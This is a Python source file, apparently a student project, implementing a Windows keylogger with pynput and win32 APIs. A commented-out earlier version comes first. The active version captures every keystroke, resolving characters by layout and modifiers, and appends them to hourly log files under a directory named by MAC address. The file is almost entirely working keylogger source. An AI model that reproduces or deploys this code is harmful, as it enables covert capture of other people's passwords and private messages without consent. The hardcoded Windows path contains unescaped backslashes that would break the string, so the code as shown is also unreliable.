# from pynput import keyboard
# import ctypes
# import win32api
# import win32gui
# import win32process
# import datetime
# import os

# user32 = ctypes.WinDLL('user32', use_last_error=True)
# BUF_SIZE = 8

# def get_current_keyboard_layout():
#     hwnd = win32gui.GetForegroundWindow()
#     thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
#     return win32api.GetKeyboardLayout(thread_id)

# def is_key_pressed(vk_code):
#     return (win32api.GetAsyncKeyState(vk_code) & 0x8000) != 0

# def get_modifier_state():
#     state = (ctypes.c_ubyte * 256)()
#     if win32api.GetKeyState(0x14) & 1:  
#         state[0x14] = 1
#     if is_key_pressed(0x10):  
#         state[0x10] = 0x80
#     if is_key_pressed(0x11): 
#         state[0x11] = 0x80
#     if is_key_pressed(0x12): 
#         state[0x12] = 0x80
#     if is_key_pressed(0xA5): 
#         state[0xA5] = 0x80
#     return state

# def get_char_from_key(vk_code, scan_code, layout):
#     state = get_modifier_state()
#     buf = ctypes.create_unicode_buffer(BUF_SIZE)

#     result = user32.ToUnicodeEx(
#         vk_code,
#         scan_code,
#         state,
#         buf,
#         BUF_SIZE,
#         0,
#         layout
#     )

#     if result > 0:
#         return buf.value
#     else:
#         return None


# class KeyLogger:
#     now = datetime.datetime.now().strftime("%d-%m-%y_%H")
#     def __init__(self, file_name=f"{now}.txt"):
#         self.file_name = file_name

#     def get_readable_special_key(self, key):
#         mapping = {
#             keyboard.Key.space: "SPACE",
#             keyboard.Key.enter: "ENTER",
#             keyboard.Key.shift: "SHIFT",
#             keyboard.Key.shift_l: "SHIFT",
#             keyboard.Key.shift_r: "SHIFT",
#             keyboard.Key.ctrl: "CTRL",
#             keyboard.Key.ctrl_l: "CTRL",
#             keyboard.Key.ctrl_r: "CTRL",
#             keyboard.Key.alt: "ALT",
#             keyboard.Key.alt_l: "ALT",
#             keyboard.Key.alt_r: "ALTGR",
#             keyboard.Key.backspace: "BACKSPACE",
#             keyboard.Key.tab: "TAB",
#             keyboard.Key.esc: "ESC",
#             keyboard.Key.caps_lock: "CAPSLOCK",
#             keyboard.Key.delete: "DELETE",
#             keyboard.Key.up: "UP",
#             keyboard.Key.down: "DOWN",
#             keyboard.Key.left: "LEFT",
#             keyboard.Key.right: "RIGHT"
#         }
#         return mapping.get(key, None)

#     def on_press(self, key):
#         try:
#             hwnd = win32gui.GetForegroundWindow()
#             thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
#             layout = win32api.GetKeyboardLayout(thread_id)

#             if hasattr(key, 'vk'):
#                 vk = key.vk
#             elif hasattr(key, 'char') and key.char is not None:
#                 vk = ord(key.char.upper())
#             else:
#                 vk = 0

#             scan = user32.MapVirtualKeyW(vk, 0)
#             char = get_char_from_key(vk, scan, layout)

#             with open(self.file_name, 'a', encoding='utf-8') as f:
#                 if char:
#                     f.write(char + '\n')
#                 else:
#                     readable = self.get_readable_special_key(key)
#                     if readable:
#                         f.write(f"[{readable}]\n")
#                     else:
#                         f.write(f"[{key}]\n")

#         except Exception as e:
#             print(f"Error: {e}")

#     def start(self):
#         with keyboard.Listener(on_press=self.on_press) as listener:
#             listener.join()

# if __name__ == '__main__':
#     logger = KeyLogger()
#     logger.start()


# keylogger/logger.py




from pynput import keyboard
import ctypes
import win32api
import win32gui
import win32process
import datetime
import os

# === הגדרות קבועות ===
user32 = ctypes.WinDLL('user32', use_last_error=True)
BUF_SIZE = 8
MAC_ADDRESS = "00-1A-2B-3C-4D-5E"  # שנה לכתובת ה-MAC של המחשב הזה

# 📁 נתיב יעד לשמירת הקבצים
BASE_LOG_DIR = "C:\Users\יוסף יצחק אוחיון\Desktop\קודקוד\fullstack\פרויקטים\keylogger\KeyLogger\backend"

# === פונקציות עזר ===
def get_current_keyboard_layout():
    hwnd = win32gui.GetForegroundWindow()
    thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
    return win32api.GetKeyboardLayout(thread_id)

def is_key_pressed(vk_code):
    return (win32api.GetAsyncKeyState(vk_code) & 0x8000) != 0

def get_modifier_state():
    state = (ctypes.c_ubyte * 256)()
    if win32api.GetKeyState(0x14) & 1:  # Caps Lock
        state[0x14] = 1
    if is_key_pressed(0x10):  # Shift
        state[0x10] = 0x80
    if is_key_pressed(0x11):  # Ctrl
        state[0x11] = 0x80
    if is_key_pressed(0x12):  # Alt
        state[0x12] = 0x80
    if is_key_pressed(0xA5):  # AltGr
        state[0xA5] = 0x80
    return state

def get_char_from_key(vk_code, scan_code, layout):
    state = get_modifier_state()
    buf = ctypes.create_unicode_buffer(BUF_SIZE)
    result = user32.ToUnicodeEx(
        vk_code, scan_code, state, buf, BUF_SIZE, 0, layout
    )
    if result > 0:
        return buf.value
    else:
        return None

def get_log_file_path(mac_address):
    mac_dir = os.path.join(BASE_LOG_DIR, mac_address)
    os.makedirs(mac_dir, exist_ok=True)

    timestamp = datetime.datetime.now().strftime("%d-%m-%y_%H")
    filename = f"{timestamp}.txt"
    return os.path.join(mac_dir, filename)

# === מחלקת הקילוגר ===
class KeyLogger:
    def __init__(self, mac_address):
        self.mac_address = mac_address

    def get_readable_special_key(self, key):
        mapping = {
            keyboard.Key.space: "SPACE",
            keyboard.Key.enter: "ENTER",
            keyboard.Key.shift: "SHIFT",
            keyboard.Key.shift_l: "SHIFT",
            keyboard.Key.shift_r: "SHIFT",
            keyboard.Key.ctrl: "CTRL",
            keyboard.Key.ctrl_l: "CTRL",
            keyboard.Key.ctrl_r: "CTRL",
            keyboard.Key.alt: "ALT",
            keyboard.Key.alt_l: "ALT",
            keyboard.Key.alt_r: "ALTGR",
            keyboard.Key.backspace: "BACKSPACE",
            keyboard.Key.tab: "TAB",
            keyboard.Key.esc: "ESC",
            keyboard.Key.caps_lock: "CAPSLOCK",
            keyboard.Key.delete: "DELETE",
            keyboard.Key.up: "UP",
            keyboard.Key.down: "DOWN",
            keyboard.Key.left: "LEFT",
            keyboard.Key.right: "RIGHT"
        }
        return mapping.get(key, str(key))

    def on_press(self, key):
        try:
            layout = get_current_keyboard_layout()

            if hasattr(key, 'vk'):
                vk = key.vk
            elif hasattr(key, 'char') and key.char is not None:
                vk = ord(key.char.upper())
            else:
                vk = 0

            scan = user32.MapVirtualKeyW(vk, 0)
            char = get_char_from_key(vk, scan, layout)

            log_path = get_log_file_path(self.mac_address)
            with open(log_path, 'a', encoding='utf-8') as f:
                if char:
                    f.write(char)
                else:
                    readable = self.get_readable_special_key(key)
                    f.write(f"[{readable}]")

        except Exception as e:
            print(f"שגיאה בהקלטת מקש: {e}")

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# === הפעלה ===
if __name__ == '__main__':
    logger = KeyLogger(MAC_ADDRESS)
    logger.start()
